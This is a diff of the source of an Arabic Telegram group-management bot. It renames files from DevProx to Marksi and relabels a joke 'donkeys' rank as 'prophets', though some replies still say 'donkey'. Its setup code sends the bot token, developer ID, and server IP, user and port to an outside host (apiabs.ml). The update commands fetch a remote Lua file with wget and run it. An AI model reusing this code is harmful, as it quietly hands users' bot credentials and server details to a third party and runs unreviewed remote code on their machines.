@@ -30,7 +30,7 @@ DevAbs:set(Server.."IdDevProx",DevId)
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end 
-os.execute('lua DevProx.lua') 
+os.execute('lua Marksi.lua') 
 end 
 if not DevAbs:get(Server.."TokenDevProx") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
@@ -46,7 +46,7 @@ end
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end  
-os.execute('lua DevProx.lua') 
+os.execute('lua Marksi.lua') 
 end 
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -68,7 +68,7 @@ SudoIds = {DevAbs:get(Server.."IdDevProx")},
 }
 Create(Config, "./config.lua") 
 https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevAbs:get(Server.."IdDevProx").."&TokenBot="..DevAbs:get(Server.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("DevProx.sh", "w")  
+file = io.open("Marksi.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/DevProx
@@ -87,7 +87,7 @@ echo "~ The Token Was Not Found In The config.lua File!"
 echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
-./tg -s ./DevProx.lua -p PROFILE --bot=$token
+./tg -s ./Marksi.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
@@ -98,7 +98,7 @@ cd $HOME/DevProx
 while(true) do
 rm -fr ../.telegram-cli
 screen -S DevProx -X kill
-screen -S DevProx ./DevProx.sh
+screen -S DevProx ./Marksi.sh
 done
 ]]) 
 file:close() 
@@ -897,7 +897,7 @@ vipmem = 'المميزين • ' else vipmem = '' end
 if DevAbs:sismember(DevProx..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) then
 cleaner = 'المنظفين • ' else cleaner = '' end
 if DevAbs:sismember(DevProx..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
-donky = 'المطايه • ' else donky = '' end
+donky = 'الانبياء • ' else donky = '' end
 if DevAbs:sismember(DevProx..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(DevProx..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(DevProx..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(DevProx..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(DevProx..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(DevProx..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
 DevAbs:srem(DevProx..'Abs:Constructor:'..data.chat_id_,data.sender_user_id_)
 DevAbs:srem(DevProx..'Abs:Managers:'..data.chat_id_,data.sender_user_id_)
@@ -947,7 +947,7 @@ SudoIds = {NewDev},
 }
 Create(Config, "./config.lua")  
 DevAbs:del(DevProx.."Abs:NewDev"..data.sender_user_id_)
-dofile('DevProx.lua') 
+dofile('Marksi.lua') 
 end
 end
 if DataText == '/nodel' and DevAbs:get(DevProx..'nodel'..data.sender_user_id_) == 'delno' then
@@ -1130,7 +1130,7 @@ local Text = [[
 ⌁︙ضع رابط
 ⌁︙ضع صوره
 ⌁︙حذف الرابط
-⌁︙حذف المطايه
+⌁︙حذف الانبياء
 ⌁︙كشف البوتات
 ⌁︙طرد البوتات
 ⌁︙تنظيف + العدد
@@ -1400,7 +1400,7 @@ local Text = [[
 ⌁︙معنى اسم + الاسم
 ⌁︙بوسه • بوسها ↫ بالرد
 ⌁︙احسب + تاريخ ميلادك
-⌁︙رفع نبي • تنزيل مطي • المطايه
+⌁︙رفع نبي • تنزيل نبي • الانبياء
 ⌁︙هينه • هينها ↫ بالرد • بالمعرف
 ⌁︙صيحه • صيحها ↫ بالرد • بالمعرف
 ⌁︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
@@ -6111,20 +6111,20 @@ function donky_by_reply(extra, result, success)
 if DevAbs:sismember(DevProx..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو مطي شرفع منه بعد😹💔") 
 else
-ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطايه") 
+ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الانبياء") 
 DevAbs:sadd(DevProx..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
 --     Source Marksi     --
 if msg.reply_to_message_id_ ~= 0  then
-if text and text:match("^تنزيل مطي$") and not DevAbs:get(DevProx..'Abs:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
+if text and text:match("^تنزيل نبي$") and not DevAbs:get(DevProx..'Abs:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
 function donky_by_reply(extra, result, success)
 if not DevAbs:sismember(DevProx..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مطي ليتم تنزيله") 
 else
 DevAbs:srem(DevProx..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
-ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطايه") 
+ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الانبياء") 
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
@@ -6440,7 +6440,7 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
 end 
 --     Source Marksi     --
-if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
+if text == "الانبياء" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
 local List = DevAbs:smembers(DevProx..'User:Donky:'..msg.chat_id_)
 text = "⌁︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
@@ -8362,8 +8362,8 @@ if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف القوانين")  
 DevAbs:del(DevProx..'Abs:rules'..msg.chat_id_)
 end
-if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
-ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المطايه")  
+if txts[2] == 'الانبياء' or txtss[2] == 'الانبياء' then
+ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الانبياء")  
 DevAbs:del(DevProx..'User:Donky:'..msg.chat_id_)
 end
 if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
@@ -8417,7 +8417,7 @@ if not BasicConstructor(msg) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط', 1, 'md')
 else
 DevAbs:del(DevProx..'Abs:Ban:'..msg.chat_id_) DevAbs:del(DevProx..'Abs:Admins:'..msg.chat_id_) DevAbs:del(DevProx..'User:Donky:'..msg.chat_id_) DevAbs:del(DevProx..'Abs:VipMem:'..msg.chat_id_) DevAbs:del(DevProx..'Abs:Filters:'..msg.chat_id_) DevAbs:del(DevProx..'Abs:Muted:'..msg.chat_id_)
-Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • الانبياء ❩ بنجاح \n ✓", 1, 'md')
 end end
 --     Source Marksi     --
 if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
@@ -8435,7 +8435,7 @@ if #constructor ~= 0 then constructort = 'المنشئين • ' else constructo
 if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
 if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
 if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
-if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
+if #donky ~= 0 then donkyt = 'الانبياء • ' else donkyt = '' end
 if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
 DevAbs:del(DevProx..'Abs:BasicConstructor:'..msg.chat_id_)
 DevAbs:del(DevProx..'Abs:Constructor:'..msg.chat_id_)
@@ -9363,7 +9363,7 @@ if text == 'جلب نسخه السورس' then
 if not Sudo(msg) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './DevProx.lua', '⌁︙نسخة ملف سورس ماركسي',dl_cb, nil)
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './Marksi.lua', '⌁︙نسخة ملف سورس ماركسي',dl_cb, nil)
 end end
 --     Source Marksi     --
 if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
@@ -10054,7 +10054,7 @@ local Text = [[
 ⌁︙ضع رابط
 ⌁︙ضع صوره
 ⌁︙حذف الرابط
-⌁︙حذف المطايه
+⌁︙حذف الانبياء
 ⌁︙كشف البوتات
 ⌁︙طرد البوتات
 ⌁︙تنظيف + العدد
@@ -10348,7 +10348,7 @@ local Text = [[
 ⌁︙معنى اسم + الاسم
 ⌁︙بوسه • بوسها ↫ بالرد
 ⌁︙احسب + تاريخ ميلادك
-⌁︙رفع نبي • تنزيل مطي • المطايه
+⌁︙رفع نبي • تنزيل نبي • الانبياء
 ⌁︙هينه • هينها ↫ بالرد • بالمعرف
 ⌁︙صيحه • صيحها ↫ بالرد • بالمعرف
 ⌁︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
@@ -10364,15 +10364,15 @@ end
 if SecondSudo(msg) then
 if text == "تحديث السورس" or text == "تحديث سورس" then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس ماركسي', 1, 'md') 
-os.execute('rm -rf DevProx.lua') 
+os.execute('rm -rf Marksi.lua') 
 os.execute('wget https://raw.githubusercontent.com/FaRaP16/Marksi3/master/Marksi.lua') 
-dofile('DevProx.lua') 
+dofile('Marksi.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
 Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار الجديد', 1, 'md') 
 end
 if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌁' then  
-dofile('DevProx.lua') 
+dofile('Marksi.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
@@ -10429,7 +10429,7 @@ local GetJson, Res = https.request("https://raw.githubusercontent.com/FaRaAP16/M
 if Res == 200 then
 os.execute("rm -fr Files/"..FileName)
 send(msg.chat_id_, msg.id_,"\n⌁︙الملف ↫ *"..FileName.."*\n⌁︙تم تعطيله وحذفه من البوت بنجاح") 
-dofile('DevProx.lua')  
+dofile('Marksi.lua')  
 else
 send(msg.chat_id_, msg.id_,"⌁︙لا يوجد ملف بهذا الاسم") 
 end
@@ -10443,7 +10443,7 @@ local ChekAuto = io.open("Files/"..FileName,'w+')
 ChekAuto:write(GetJson)
 ChekAuto:close()
 send(msg.chat_id_, msg.id_,"\n⌁︙الملف ↫ *"..FileName.."*\n⌁︙تم تفعيله في البوت بنجاح") 
-dofile('DevProx.lua')  
+dofile('Marksi.lua')  
 else
 send(msg.chat_id_, msg.id_,"⌁︙لا يوجد ملف بهذا الاسم") 
 end
